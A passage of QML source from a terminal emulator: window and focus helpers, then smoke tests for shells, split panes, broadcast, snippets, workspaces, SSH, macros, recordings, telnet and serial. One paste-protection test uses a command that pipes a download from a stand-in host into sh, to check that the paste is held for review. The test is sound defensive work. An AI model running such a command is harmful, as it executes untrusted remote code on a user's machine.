            recordSidePanelWidth(slot.width);
    }

    function recordSidePanelWidth(width) {
        const rounded = Math.round(width);
        if (rounded < sidePanelMinimumWidth || rounded === Math.round(sidePanelWidth))
            return;
        sidePanelWidth = rounded;
        if (persistState) {
            UiState.sidePanelWidth = rounded;
            scheduleSave();
        }
    }

    // OsSplitter's keyboard resizing assigns a slot's preferred width, which drops its binding to
    // sidePanelWidth; bind both slots again (e.g. before the panel changes sides).
    function syncSidePanelWidth() {
        leftSlot.T.SplitView.preferredWidth = Qt.binding(() => shell.sidePanelWidth);
        rightSlot.T.SplitView.preferredWidth = Qt.binding(() => shell.sidePanelWidth);
    }

    function togglePalette() {
        if (palette.opened)
            palette.close();
        else
            palette.open();
    }

    function toggleNotifications() {
        if (notifications.opened)
            notifications.close();
        else
            notifications.open();
    }

    function toggleMaximize() {
        if (window.visibility === Window.Maximized)
            window.showNormal();
        else
            window.showMaximized();
    }

    function toggleFullScreen() {
        if (window.visibility === Window.FullScreen) {
            if (restoreMaximized)
                window.showMaximized();
            else
                window.showNormal();
        } else {
            restoreMaximized = window.visibility === Window.Maximized;
            window.showFullScreen();
        }
    }

    function shortcutText(actionId) {
        return shortcutHost.nativeText(actionId);
    }

    // Focus regions, in Tab order.
    function regions() {
        return [titleRegion, rail, contentArea, sidePanel, statusBar];
    }

    function isInside(item, region) {
        for (let current = item; current; current = current.parent) {
            if (current === region)
                return true;
        }
        return false;
    }

    function firstFocusable(region) {
        if (!region || !region.visible)
            return null;
        // A terminal tab's way in is its focused pane, not the first one.
        if (region === contentArea && currentTab > 0 && currentWorkspace && currentWorkspace.focusedItem)
            return currentWorkspace.focusedItem.terminal;
        const next = region.nextItemInFocusChain(true);
        return next && next !== region && isInside(next, region) ? next : null;
    }

    function focusRegion(region, reason) {
        const target = firstFocusable(region);
        if (target)
            target.forceActiveFocus(reason ?? Qt.TabFocusReason);
        return target !== null;
    }

    // Hiding an item doesn't take its keyboard focus away, and key events still reach it (a
    // hidden button would still press, a hidden slider would still change its setting). Call this
    // after the visible content changed: it moves the focus from a hidden item to the content
    // shown now, else to the rail or the title bar. The focus reason is kept, so the focus ring
    // shows for keyboard users but not after a click.
    function moveFocusOffHiddenItem() {
        const focused = window.activeFocusItem;
        if (!focused || focused.visible)
            return;
        const reason = focused.focusReason ?? Qt.OtherFocusReason;
        if (!focusRegion(contentArea, reason) && !focusRegion(rail, reason))
            focusRegion(titleRegion, reason);
    }

    function cycleRegion(step) {
        const list = regions();
        const focused = window.activeFocusItem;
        let index = -1;
        for (let i = 0; i < list.length; ++i) {
            if (focused && isInside(focused, list[i])) {
                index = i;
                break;
            }
        }
        if (index < 0)
            index = step > 0 ? -1 : list.length;
        for (let k = 0; k < list.length; ++k) {
            index = (index + step + list.length) % list.length;
            if (focusRegion(list[index]))
                return;
        }
    }

    // Functions for SmokeTest.steps: a real local terminal (shell output, typed input, closing
    // the tab ends the session, a shell that exits closes its tab). `smoke` is the SmokeTest.
    function terminalSmokeSteps(smoke) {
        const timeout = 15000;
        const marker = "opensesh-smoke-" + Math.floor(Math.random() * 1e9);
        let pane = null;
        let tabId = 0;
        let paneId = 0;
        let deadline = 0;
        let profileId = "";
        // A step that polls `condition` until it holds, then runs `next` (which may return steps).
        const waitFor = (what, condition, next) => {
            const poll = () => {
                if (condition())
                    return next ? next() : [];
                if (Date.now() > deadline) {
                    smoke.fail("timed out after " + timeout / 1000 + " s waiting for " + what);
                    return [];
                }
                return [poll];
            };
            return poll;
        };
        const openTab = what => {
            shell.newTab();
            pane = shell.currentTerminal;
            if (!pane) {
                smoke.fail("no terminal tab after opening one");
                return [];
            }
            tabId = shell.currentTabId;
            paneId = pane.paneId;
            deadline = Date.now() + timeout;
            return [waitFor(what, () => pane.terminal.screenText().trim().length > 0)];
        };
        return [
            () => openTab("the shell's first output"),
            () => {
                pane.terminal.sendText("echo " + marker + "\r");
                deadline = Date.now() + timeout;
                return [waitFor("the echoed marker " + marker,
                                () => pane.terminal.screenText().split("\n").some(line => line.trim() === marker))];
            },
            () => {
                console.info("smoke test: the local terminal echoed", marker);
                // A profile change reaches the open terminal at once (test runs keep profiles
                // in memory and never write them).
                profileId = TerminalProfiles.createProfile("Smoke test", "");
                if (profileId.length === 0) {
                    smoke.fail("could not create a profile");
                    return [];
                }
                TerminalProfiles.setOption(profileId, "font_size", "20");
                pane.useProfile(profileId);
                deadline = Date.now() + timeout;
                return [waitFor("the pane to use the new profile", () => pane.terminal.fontSize === 20)];
            },
            () => {
                TerminalProfiles.setOption(profileId, "font_size", "18");
                TerminalProfiles.setOption(profileId, "highlight_sets", JSON.stringify(["logs", "network"]));
                deadline = Date.now() + timeout;
                return [waitFor("a live profile edit to reach the terminal", () => pane.terminal.fontSize === 18)];
            },
            () => {
                pane.zoom(1);
                pane.toggleHighlight();
                deadline = Date.now() + timeout;
                return [waitFor("the pane's zoom", () => pane.terminal.fontSize === 19)];
            },
            () => {
                const find = ActionRegistry.find("terminal.find");
                Keybindings.setShortcut("terminal.find", "Ctrl+Alt+F", find.defaultShortcut);
                if (find.shortcut !== "Ctrl+Alt+F")
                    smoke.fail("a changed shortcut did not reach its action");
                Keybindings.reset("terminal.find");
                if (find.shortcut !== find.defaultShortcut)
                    smoke.fail("a reset shortcut did not go back to the default");
                TerminalProfiles.deleteProfile(profileId);
                deadline = Date.now() + timeout;
                return [waitFor("the pane to fall back to the default profile", () => pane.terminal.fontSize !== 19 && pane.terminal.fontSize > 0,
                                () => console.info("smoke test: profile changes reached the terminal live"))];
            },
            () => {
                // A shell from the new tab menu (Sprint 12): the list is found in the
                // background; a test run starts its hermetic shell whatever the choice.
                deadline = Date.now() + timeout;
                return [waitFor("the list of local shells", () => JSON.parse(Platform.shells || "[]").length > 0)];
            },
            () => {
                const first = JSON.parse(Platform.shells)[0];
                if (!shell.newTabWithShell(first))
                    smoke.fail("a tab with a shell didn't open");
                const chosen = shell.currentTerminal;
                if (!chosen || chosen.shellCommand !== first.command || chosen.terminal.shell !== first.command
                        || chosen.label !== first.name)
                    smoke.fail("the new tab doesn't run the shell picked: " + JSON.stringify(first));
                const entry = shell.tabEntry(shell.currentTab, false);
                if (entry.panes[0].shell !== first.command)
                    smoke.fail("a saved workspace wouldn't keep the shell");
                deadline = Date.now() + timeout;
                return [waitFor("the picked shell's session", () => chosen.terminal.running,
                                () => {
                                    console.info("smoke test: a tab opened with a shell from the list (" + first.name + ")");
                                    shell.closeTab(shell.currentTab);
                                    return [];
                                })];
            },
            () => {
                shell.closeTabById(tabId);
                if (TerminalSessions.isOpen(paneId))
                    smoke.fail("the session of a closed tab is still open");
            },
            () => shell.splitSmokeSteps(smoke),
            () => shell.hostSmokeSteps(smoke),
            () => shell.sftpSmokeSteps(smoke),
            () => shell.tunnelSmokeSteps(smoke),
            () => shell.protocolSmokeSteps(smoke),
            () => shell.desktopSmokeSteps(smoke),
            () => shell.vncSmokeSteps(smoke),
            () => openTab("the second shell's first output"),
            () => {
                pane.terminal.sendText("exit\r");
                deadline = Date.now() + timeout;
                return [waitFor("the shell to exit and close its tab",
                                () => shell.tabIndexOf(tabId) < 0 && !TerminalSessions.isOpen(paneId),
                                () => console.info("smoke test: the shell exited and closed its tab"))];
            }
        ];
    }

    // Functions for SmokeTest.steps: splits, focus, zoom, broadcast reaching only the receiving
    // panes, a workspace saved and restored identically, and a tab moved to a new window and back.
    function splitSmokeSteps(smoke) {
        const timeout = 15000;
        let deadline = 0;
        let workspace = null;
        let a = 0;
        let b = 0;
        let c = 0;
        const marker = "opensesh-broadcast-" + Math.floor(Math.random() * 1e9);
        const waitFor = (what, condition, next) => {
            const poll = () => {
                if (condition())
                    return next ? next() : [];
                if (Date.now() > deadline) {
                    smoke.fail("timed out after " + timeout / 1000 + " s waiting for " + what);
                    return [];
                }
                return [poll];
            };
            return poll;
        };
        const expect = (condition, what) => {
            if (!condition)
                smoke.fail(what);
            return condition;
        };
        // The rows joined: the command wraps in a narrow pane.
        const hasMarker = id => {
            const item = workspace.paneItem(id);
            return item !== null && item.terminal.screenText().replace(/\n/g, "").indexOf(marker) >= 0;
        };
        const ready = id => {
            const item = workspace.paneItem(id);
            return item !== null && item.terminal.running && item.terminal.screenText().trim().length > 0;
        };
        // The layout with pane ids replaced by their position in the tab's pane list.
        const shape = entry => {
            const index = {};
            entry.panes.forEach((pane, i) => index[pane.id] = i);
            const walk = node => node.pane !== undefined ? { pane: index[node.pane] }
                                                         : { split: node.split, ratio: Math.round(node.ratio * 1000),
                                                             first: walk(node.first), second: walk(node.second) };
            return JSON.stringify({
                layout: walk(entry.layout),
                focused: index[entry.focused],
                zoomed: entry.zoomed ? index[entry.zoomed] : -1,
                title: entry.title,
                color: entry.color,
                pinned: entry.pinned,
                profiles: entry.panes.map(pane => pane.profile)
            });
        };
        let savedShape = "";
        let movedTab = 0;
        let otherShell = null;
        let otherIds = [];
        let snippetId = "";
        // Short, so it doesn't wrap in a narrow pane.
        const token = "s" + marker.slice(-6);
        // The screen's rows joined: a command that wraps in a narrow pane reads whole again.
        const screenOf = id => workspace.paneItem(id).terminal.screenText().replace(/\n/g, "");
        return [
            () => {
                shell.newTab();
                workspace = shell.currentWorkspace;
                if (!expect(workspace !== null, "no workspace after opening a tab"))
                    return [];
                a = workspace.focusedPane;
                b = workspace.splitPane(a, "horizontal");
                c = workspace.splitPane(b, "vertical");
                expect(b > 0 && c > 0 && workspace.paneCount === 3, "splitting did not give three panes");
                expect(workspace.focusedPane === c, "the new pane did not take the focus");
                deadline = Date.now() + timeout;
                return [waitFor("three running shells", () => ready(a) && ready(b) && ready(c))];
            },
            () => {
                workspace.moveFocus("left");
                expect(workspace.focusedPane === a, "Alt+Left did not reach the left pane");
                workspace.moveFocus("right");
                expect(workspace.focusedPane === b, "Alt+Right did not go back to the top right pane");
                workspace.moveFocus("down");
                expect(workspace.focusedPane === c, "Alt+Down did not reach the bottom right pane");
                const before = workspace.paneItem(a).width;
                workspace.focusPane(a);
                workspace.resizePane("right");
                expect(workspace.paneItem(a).width > before, "Alt+Shift+Right did not grow the pane");
                workspace.swapPane("right");
                expect(workspace.paneItem(a).x > workspace.paneItem(b).x, "swapping did not move the pane");
                workspace.swapPane("left");
                workspace.toggleZoom(c);
                expect(workspace.paneItem(c).width === workspace.width && !workspace.paneItem(a).visible,
                       "the maximized pane does not fill the tab");
                workspace.toggleZoom(c);
                expect(workspace.paneItem(a).visible, "restoring the size did not show the other panes");
            },
            () => {
                // Broadcast from a to b; c leaves, so it must not get the text.
                workspace.toggleBroadcast();
                workspace.setPaneReceiving(c, false);
                expect(workspace.paneItem(a).receiving && workspace.paneItem(b).receiving && !workspace.paneItem(c).receiving,
                       "the receiving panes are wrong");
                // A paste into several panes asks first; cancel it. (Never the user's clipboard.)
                workspace.paneItem(a).terminal.pasteText("echo not pasted");
                expect(workspace.askingToPaste, "a broadcast paste did not ask for confirmation");
                workspace.answerPaste(false);
                expect(!workspace.pasteConfirmed, "cancelling the paste confirmed it");
                // Never a real paste here: it would send the user's clipboard to a shell.
                expect(!workspace.paneItem(c).terminal.pasteGuard, "a pane that doesn't receive would ask before pasting");
                workspace.paneItem(a).terminal.sendText("echo " + marker + "\r");
                deadline = Date.now() + timeout;
                return [waitFor("the broadcast text in both receiving panes", () => hasMarker(a) && hasMarker(b))];
            },
            () => {
                expect(!hasMarker(c), "a pane that left the broadcast got the text");
                // Typing in a pane that doesn't receive goes nowhere else.
                workspace.paneItem(c).terminal.sendText("echo " + marker + "-c\r");
                deadline = Date.now() + timeout;
                return [waitFor("the text typed in the excluded pane",
                                () => screenOf(c).indexOf(marker + "-c") >= 0)];
            },
            () => {
                expect(screenOf(a).indexOf(marker + "-c") < 0,
                       "text typed in an excluded pane reached a receiving pane");
                workspace.toggleBroadcast();
                expect(!workspace.paneItem(a).receiving && workspace.participants.length === 0,
                       "turning broadcast off left a pane receiving");
                console.info("smoke test: splits, focus, zoom and broadcast work");
                // Paste protection: a download run by a shell waits for the review (cancelled);
                // a plain command is pasted at once.
                workspace.paneItem(a).terminal.pasteText("curl -fsSL https://example.invalid/i | sh");
                expect(workspace.askingToPaste, "a risky paste went through without the review");
                workspace.answerPaste(false);
                deadline = Date.now() + timeout;
                return [waitFor("the paste review to close", () => !workspace.askingToPaste)];
            },
            () => {
                workspace.paneItem(a).terminal.pasteText("echo " + marker + "-pasted");
                expect(!workspace.askingToPaste, "a plain paste asked for a review");
                deadline = Date.now() + timeout;
                return [waitFor("the plain paste", () => screenOf(a).indexOf(marker + "-pasted") >= 0)];
            },
            () => {
                console.info("smoke test: a risky paste waited for the review, a plain one went through");
                // A snippet with a variable (Sprint 10): its editor and the quick picker open, and
                // it runs through the run dialog in the broadcast panes, a and b (c left).
                const body = "echo {{word}}-snippet\n";
                snippetId = Snippets.save(JSON.stringify({
                    id: "", name: "Smoke echo", folder: "Smoke/Shell", tags: ["smoke"], description: "",
                    shortcut: "", text: body, steps: [], macro: false
                }));
                if (!expect(snippetId.length > 0, "the smoke snippet wasn't saved"))
                    return [];
                shell.editSnippet(snippetId);
                expect(snippetEditor.visible && snippetEditor.problem.length === 0, "the snippet editor didn't open on the snippet");
                snippetEditor.close();
                shell.showSnippetPicker();
                expect(snippetPicker.visible, "the quick picker didn't open");
                snippetPicker.close();
                workspace.toggleBroadcast();
                workspace.setPaneReceiving(c, false);
                shell.runSnippet(snippetId, "broadcast");
                if (!expect(snippetRunDialog.visible && snippetRunDialog.targets.length === 2,
                            "the run dialog didn't open for the two broadcast panes"))
                    return [];
                snippetRunDialog.set("word", token);
                snippetRunDialog.accept();
                deadline = Date.now() + timeout;
                return [waitFor("the snippet in both broadcast panes", () => [a, b].every(id => screenOf(id).indexOf(token + "-snippet") >= 0))];
            },
            () => {
                expect(screenOf(c).indexOf(token) < 0, "the snippet reached a pane outside the broadcast");
                workspace.toggleBroadcast();
                Snippets.remove(snippetId);
                console.info("smoke test: a snippet with a variable ran in the broadcast panes");
                // A workspace survives saving and opening identically (no file in test runs).
                const index = shell.tabIndexOf(shell.currentTabId);
                shell.renameTab(index, "Smoke layout");
                shell.setTabColor(index, "teal");
                workspace.focusPane(b);
                workspace.setRatio("[]", 0.3);
                const entry = shell.tabEntry(index, false);
                savedShape = shape(entry);
                const text = Workspaces.roundTrip(JSON.stringify({ name: "Smoke", windows: [{ currentTab: 0, tabs: [entry] }] }));
                if (!expect(text.length > 0, "the workspace round trip failed"))
                    return [];
                const restored = JSON.parse(text);
                shell.openTabs(restored.windows[0].tabs, 0);
                const again = shell.tabEntry(shell.currentTab, false);
                expect(shape(again) === savedShape, "the restored layout differs: " + shape(again) + " vs " + savedShape);
                expect(again.panes.every(pane => entry.panes.every(old => old.id !== pane.id)), "a restored pane reused an id");
                workspace = shell.currentWorkspace;
                deadline = Date.now() + timeout;
                return [waitFor("the restored shells", () => workspace.paneIds.every(id => ready(id)),
                                () => console.info("smoke test: a workspace was restored identically"))];
            },
            () => {
                // Move the restored tab to a new window and back: the same sessions, no restart.
                movedTab = shell.currentTabId;
                const ids = workspace.paneIds.slice();
                const other = shell.moveTabToNewWindow(shell.currentTab);
                if (!expect(other !== null, "moving a tab to a new window failed"))
                    return [];
                expect(shell.tabIndexOf(movedTab) < 0 && other.tabIndexOf(movedTab) > 0, "the tab did not move");
                expect(ids.every(id => TerminalSessions.isOpen(id)), "moving a tab ended its sessions");
                other.moveTabToShell(other.tabIndexOf(movedTab), shell);
                expect(shell.tabIndexOf(movedTab) > 0, "the tab did not come back");
                expect(ids.every(id => TerminalSessions.isOpen(id)), "moving a tab back ended its sessions");
                workspace = shell.currentWorkspace;
                deadline = Date.now() + timeout;
                return [waitFor("the detached window to close", () => WindowRegistry.shells.length === 1,
                                () => console.info("smoke test: a tab moved to a new window and back"))];
            },
            () => {
                // A workspace with two windows (as the last session is restored): the first
                // window's tabs open here, the second window opens on its own.
                const entry = shell.tabEntry(shell.currentTab, false);
                const text = Workspaces.roundTrip(JSON.stringify({
                    name: "Two windows",
                    windows: [{ currentTab: 0, tabs: [entry] }, { currentTab: 0, tabs: [entry] }]
                }));
                if (!expect(text.length > 0, "the two-window round trip failed"))
                    return [];
                const before = shell.sessionCount;
                WindowRegistry.openWorkspace(JSON.parse(text), shell);
                expect(shell.sessionCount === before + 1, "the first window's tab did not open in this window");
                const other = WindowRegistry.shells.find(candidate => candidate !== shell);
                if (!expect(other !== undefined && other.sessionCount === 1, "the second window did not open with its tab"))
                    return [];
                // Closing a window ends the sessions of its tabs: once its shells run, it asks first.
                otherShell = other;
                otherIds = other.currentWorkspace ? other.currentWorkspace.paneIds.slice() : [];
                expect(otherIds.length === 3, "the second window's tab doesn't have its three panes");
                deadline = Date.now() + timeout;
                return [waitFor("the second window's shells", () => other.runningSessionCount() === 3)];
            },
            () => {
                otherShell.window.close();
                if (!expect(otherShell.askingToClose && otherIds.every(id => TerminalSessions.isOpen(id)),
                            "closing a window with running shells didn't ask first"))
                    return [];
                otherShell.answerClose(true);
                deadline = Date.now() + timeout;
                return [waitFor("the second window to close and end its sessions",
                                () => WindowRegistry.shells.length === 1 && otherIds.every(id => !TerminalSessions.isOpen(id)),
                                () => console.info("smoke test: a two-window workspace opened; closing a window asked first, then ended its sessions"))];
            },
            () => {
                // Tab strip operations.
                const index = shell.tabIndexOf(movedTab);
                shell.duplicateTab(index);
                expect(shell.sessionCount >= 3, "duplicating a tab failed");
                const copy = shell.currentTabId;
                shell.setTabPinned(shell.currentTab, true);
                expect(shell.tabIndexOf(copy) === 1, "a pinned tab did not move first");
                shell.setTabPinned(1, false);
                shell.closeTabById(copy);
                expect(shell.reopenClosedTab() && shell.sessionCount >= 3, "reopening a closed tab failed");
                shell.showSwitcher(1);
                shell.closeOtherTabs(shell.currentTab, "others");
                expect(shell.sessionCount === 1, "closing the other tabs left " + shell.sessionCount);
                shell.closeTab(shell.currentTab);
                expect(shell.sessionCount === 0, "closing the last tab left one open");
            }
        ];
    }

    // Functions for SmokeTest.steps: a saved host connected with the built-in SSH client (every
    // connection of the smoke test goes to the in-process test server, never the network): the
    // host key card, a wrong then a right password, the remote shell, a dropped connection and
    // Enter to reconnect (the key trusted once isn't asked again); then a split to the same host
    // and a request from another process.
    function hostSmokeSteps(smoke) {
        const timeout = 15000;
        let deadline = 0;
        let tabId = 0;
        let pane = null;
        let serial = 0;
        const waitFor = (what, condition, next) => {
            const poll = () => {
                if (condition())
                    return next ? next() : [];
                if (Date.now() > deadline) {
                    smoke.fail("timed out after " + timeout / 1000 + " s waiting for " + what);
                    return [];
                }
                return [poll];
            };
            return poll;
        };
        const wait = (what, condition, next) => {
            deadline = Date.now() + timeout;
            return [waitFor(what, condition, next)];
        };
        const question = () => pane && pane.terminal.prompt.length > 0 ? JSON.parse(pane.terminal.prompt) : {};
        const state = () => pane && pane.terminal.connection.length > 0 ? JSON.parse(pane.terminal.connection).state : "";
        const screen = () => pane ? pane.terminal.screenText() : "";
        let macroId = "";
        let stuckId = "";
        let recording = "";
        let player = null;
        const runs = [];
        const onRunEnded = (id, paneId, code, detail) => runs.push({ id: id, pane: paneId, code: code, detail: detail });
        return [
            () => {
                if (AppInfo.startSshTestServer() <= 0)
                    smoke.fail("the SSH test server didn't start");
                Hosts.loadFixture(40);
                const command = Hosts.connectCommand("H00000");
                if (command[0] !== "ssh" || command[command.length - 1] !== "deploy@10.0.0.1")
                    smoke.fail("the ssh command of a fixture host is wrong: " + JSON.stringify(command));
                if (Hosts.usesOpenSsh("H00000"))
                    smoke.fail("a host uses OpenSSH without asking for it");
                if (!shell.connectHost("H00000", "tab"))
                    smoke.fail("connecting to a saved host opened nothing");
                tabId = shell.currentTabId;
                pane = shell.currentTerminal;
                if (!pane || pane.kind !== "ssh" || pane.host !== "H00000" || pane.terminal.command.length !== 0)
                    smoke.fail("the pane doesn't connect to the host with the built-in client");
                if (!(WindowRegistry.openHosts["H00000"] > 0))
                    smoke.fail("the Hosts view wouldn't show the open session");
                return wait("the host key card", () => question().kind === "hostKey");
            },
            () => {
                const card = question();
                if (card.changed || !String(card.fingerprint).startsWith("SHA256:"))
                    smoke.fail("the host key card is wrong: " + pane.terminal.prompt);
                pane.terminal.answerPrompt(card.id, "trust-once", []);
                return wait("the password prompt", () => question().kind === "password");
            },
            () => {
                pane.terminal.answerPrompt(question().id, "submit", ["not the password"]);
                return wait("the password prompt after a wrong password", () => question().kind === "password" && question().retry === true);
            },
            () => {
                pane.terminal.answerPrompt(question().id, "submit", ["right password"]);
                return wait("the remote shell", () => state() === "connected" && screen().indexOf("test$") >= 0);
            },
            () => {
                pane.terminal.sendText("drop\r");
                return wait("the disconnected banner", () => state() === "disconnected");
            },
            () => {
                pane.terminal.sendText("\r");
                return wait("the password prompt of the reconnection", () => question().kind === "password");
            },
            () => {
                pane.terminal.answerPrompt(question().id, "submit", ["right password"]);
                return wait("the reconnected shell", () => state() === "connected",
                            () => console.info("smoke test: an SSH pane asked for the host key and the password, connected and reconnected"));
            },
            // The remote monitor (Sprint 11): the test server's readings reach the status bar (CPU
            // needs two), and the Info tab reads the host over the same connection.
            () => wait("the remote monitor's readings in the status bar",
                       () => statusBar.monitorText.indexOf("CPU 12%") >= 0 && statusBar.monitorText.indexOf("/ 40%") >= 0),
            () => {
                shell.setSidePanelOpen(true);
                sidePanel.currentIndex = 1;
                return wait("the host info in the Info tab", () => sidePanel.info.mode === "ready");
            },
            () => {
                const text = sidePanel.info.asText();
                if (text.indexOf("test-server (Debian GNU/Linux 13 (trixie))") < 0 || text.indexOf("eth0 10.0.0.5/24") < 0
                        || text.indexOf("CPU: 12.0%") < 0)
                    smoke.fail("the Info tab's text is wrong: " + text);
                console.info("smoke test: the remote monitor's readings reached the status bar, and the Info tab read the host");
            },
            // The side panel's files: the pane's own connection, following the shell's folder (a
            // test run never writes the settings).
            () => {
                AppSettings.sftpFollowTerminal = true;
                shell.setSidePanelOpen(true);
                sidePanel.currentIndex = 0;
                return wait("the side panel's files", () => sidePanel.files.pane !== null && sidePanel.files.pane.ready
                            && sidePanel.files.pane.browser.rowOf("docs") >= 0);
            },
            () => {
                pane.terminal.sendText("cd /docs\r");
                return wait("the side panel to follow the shell", () => sidePanel.files.pane.browser.path === "/docs"
                            && sidePanel.files.pane.browser.rowOf("readme.txt") >= 0,
                            () => console.info("smoke test: the side panel showed an SSH pane's files over its connection and followed its folder"));
            },
            // The connection drops: after Enter reconnects, the side panel works on the new one.
            () => {
                serial = pane.terminal.connectionSerial;
                pane.terminal.sendText("drop\r");
                return wait("the second disconnection", () => state() === "disconnected");
            },
            () => {
                pane.terminal.sendText("\r");
                return wait("the password prompt of the second reconnection", () => question().kind === "password");
            },
            () => {
                pane.terminal.answerPrompt(question().id, "submit", ["right password"]);
                return wait("the second reconnection", () => state() === "connected" && pane.terminal.connectionSerial > serial
                            && sidePanel.files.pane !== null && sidePanel.files.pane.ready);
            },
            () => {
                sidePanel.files.pane.navigate("/logs");
                return wait("the side panel on the new connection", () => sidePanel.files.pane.browser.path === "/logs"
                            && sidePanel.files.pane.browser.rowOf("app-000.log") >= 0,
                            () => console.info("smoke test: the side panel opened again on the reconnected connection"));
            },
            () => shell.setSidePanelOpen(false),
            // Macros and recordings on the SSH pane (Sprint 10): the session is recorded while a
            // macro types, waits for the server's prompt and types again, and one whose text never
            // shows stops on its timeout; then the recording plays in a tab.
            () => {
                const save = (name, steps) => Snippets.save(JSON.stringify({
                    id: "", name: name, folder: "", tags: [], description: "", shortcut: "", text: "", steps: steps, macro: true
                }));
                const send = line => ({ kind: "send", text: line + "\n" }); // lint-qml: allow (typed into the test shell)
                macroId = save("Smoke macro", [send("cd /logs"), { kind: "wait", pattern: "test\\$", timeout: 10000 }, send("macro-done")]);
                stuckId = save("Smoke stuck", [{ kind: "wait", pattern: "never shows", timeout: 300 }, send("not typed")]);
                if (macroId.length === 0 || stuckId.length === 0)
                    smoke.fail("the smoke macros weren't saved");
                recording = Recordings.start(pane.paneId, "smoke recording");
                if (recording.length === 0 || !pane.recordingSession)
                    smoke.fail("the session recording didn't start");
                Snippets.runEnded.connect(onRunEnded);
                Snippets.run(macroId, "{}", JSON.stringify([pane.paneId]));
                Snippets.run(stuckId, "{}", JSON.stringify([pane.paneId]));
                return wait("the macros to end", () => runs.length === 2);
            },
            () => {
                Snippets.runEnded.disconnect(onRunEnded);
                if (!runs.some(run => run.id === macroId && run.code === "") || screen().indexOf("macro-done") < 0)
                    smoke.fail("the macro with a wait didn't finish: " + JSON.stringify(runs));
                if (!runs.some(run => run.id === stuckId && run.code === "timeout") || screen().indexOf("not typed") >= 0)
                    smoke.fail("the macro waiting for text that never shows didn't stop: " + JSON.stringify(runs));
                Snippets.remove(macroId);
                Snippets.remove(stuckId);
                console.info("smoke test: a macro waited for the prompt and went on; one whose text never showed stopped on its timeout");
                if (Recordings.stop(pane.paneId) !== recording || pane.recordingSession)
                    smoke.fail("the session recording didn't stop");
                return wait("the recording in the History list",
                            () => JSON.parse(Recordings.list || "[]").some(entry => entry.path === recording && !entry.recording));
            },
            () => {
                if (!shell.playRecording(recording))
                    smoke.fail("the recording didn't open in a tab");
                player = shell.currentTerminal;
                if (!player || player.kind !== "player")
                    smoke.fail("the recording's tab has no player");
                return wait("the recording to play to its end", () => player.terminal.screenText().indexOf("macro-done") >= 0
                            && player.playerState.duration > 0 && !player.playerState.playing);
            },
            () => {
                // Back to the start, paused: the screen clears.
                player.playerCommand("seek", 0);
                return wait("the jump back to the start", () => player.terminal.screenText().indexOf("macro-done") < 0);
            },
            () => {
                console.info("smoke test: the session was recorded, listed and played in a tab");
                shell.closeTab(shell.currentTab);
                shell.selectTabById(tabId);
                pane = shell.currentTerminal;
            },
            // "Install my key": pick a key, connect in a new tab, the key goes in.
            () => {
                shell.installKey("H00000");
                if (!installKeyDialog.visible || installKeyDialog.choices.length === 0)
                    smoke.fail("the install key dialog offers no key (" + installKeyDialog.choices.length + " keys)");
                installKeyDialog.selected = 0;
                installKeyDialog.install();
                pane = shell.currentTerminal;
                if (!pane || pane.installKey.length === 0)
                    smoke.fail("installing a key opened no pane for it");
                return wait("the host key card before installing a key", () => question().kind === "hostKey");
            },
            () => {
                pane.terminal.answerPrompt(question().id, "trust-once", []);
                return wait("the password prompt before installing a key", () => question().kind === "password");
            },
            () => {
                pane.terminal.answerPrompt(question().id, "submit", ["right password"]);
                return wait("the key to be installed", () => pane.keyInstallResult === "added",
                            () => console.info("smoke test: a public key was installed on the server"));
            },
            () => {
                shell.closeTab(shell.currentTab);
                shell.selectTabById(tabId);
                pane = shell.currentTerminal;
            },
            () => {
                if (!shell.connectHost("H00000", "right") || shell.currentWorkspace.paneCount !== 2)
                    smoke.fail("connecting in a split didn't split the tab");
                if (JSON.parse(Hosts.search("", "recent", "", "", "name"))[0].id !== "H00000")
                    smoke.fail("the connection isn't in Recent");
                Instance.simulate("connect", "cache-01.eu-west");
                deadline = Date.now() + timeout;
                return [waitFor("the connection requested by another process", () => shell.currentTabId !== tabId,
                                () => console.info("smoke test: saved hosts connect in tabs, splits and from other processes"))];
            },
            () => {
                shell.closeOtherTabs(shell.currentTab, "others");
                shell.closeTab(shell.currentTab);
                deadline = Date.now() + timeout;
                return [waitFor("closed sessions to stop counting as open", () => !WindowRegistry.openHosts["H00000"])];
            }
        ];
    }

    // Functions for SmokeTest.steps: the other terminal kinds (Sprint 12) against their test
    // servers and devices (never the network): telnet with its warning, the window size
    // negotiated, and the end of the connection.
    function protocolSmokeSteps(smoke) {
        const timeout = 15000;
        let deadline = 0;
        let pane = null;
        const screen = () => pane ? pane.terminal.screenText().replace(/\n/g, "") : "";
        const wait = (what, condition, next) => {
            deadline = Date.now() + timeout;
            const poll = () => {
                if (condition())
                    return next ? next() : [];
                if (Date.now() > deadline) {
                    smoke.fail("timed out after " + timeout / 1000 + " s waiting for " + what + "; the screen ends with: "
                               + screen().trim().slice(-300));
                    return [];
                }
                return [poll];
            };
            return [poll];
        };
        return [
            () => {
                if (AppInfo.startTelnetTestServer() <= 0)
                    smoke.fail("the telnet test server didn't start");
                if (!shell.connectTarget("telnet://router.example:2323", "tab"))
                    smoke.fail("telnet quick connect opened nothing");
                pane = shell.currentTerminal;
                if (!pane || pane.kind !== "telnet" || pane.terminal.connectTarget.length === 0)
                    smoke.fail("the pane isn't a telnet pane");
                return wait("the telnet server's prompt", () => screen().indexOf("OpenSesh telnet test server") >= 0
                            && screen().indexOf("test>") >= 0);
            },
            () => {
                if (screen().indexOf("in clear") < 0)
                    smoke.fail("telnet didn't warn that it sends everything in clear");
                pane.terminal.sendText("size\r");
                const expected = pane.terminal.columns + "x" + pane.terminal.lines;
                return wait("the window size the server was told (" + expected + ")", () => screen().indexOf(expected) >= 0);
            },
            () => {
                pane.terminal.sendText("exit\r");
                return wait("the end of the telnet connection", () => !pane.terminal.running,
                            () => {
                                console.info("smoke test: telnet connected to its test server, with the warning and the window size, and ended");
                                shell.closeTab(shell.currentTab);
                                return [];
                            });
            },
            // A serial port (a loopback plug in a test run): what is typed comes back, then in
            // hexadecimal, then a break.
            () => {
                if (!shell.connectTarget("serial://COM7?baud=9600", "tab"))
                    smoke.fail("serial quick connect opened nothing");
                pane = shell.currentTerminal;
                if (!pane || pane.kind !== "serial")
                    smoke.fail("the pane isn't a serial pane");
                return wait("the serial device's greeting", () => screen().indexOf("OpenSesh serial test device") >= 0
                            && screen().indexOf("9600 8N1") >= 0);
            },
            () => {
                pane.terminal.sendText("ping\r");
                return wait("the loopback's echo", () => screen().indexOf("ping") >= 0);
            },
            () => {
                if (!pane.terminal.serialCommand("hex", true) || !pane.terminal.serialHex())
                    smoke.fail("the hexadecimal view didn't turn on");
                pane.terminal.sendText("Hi");
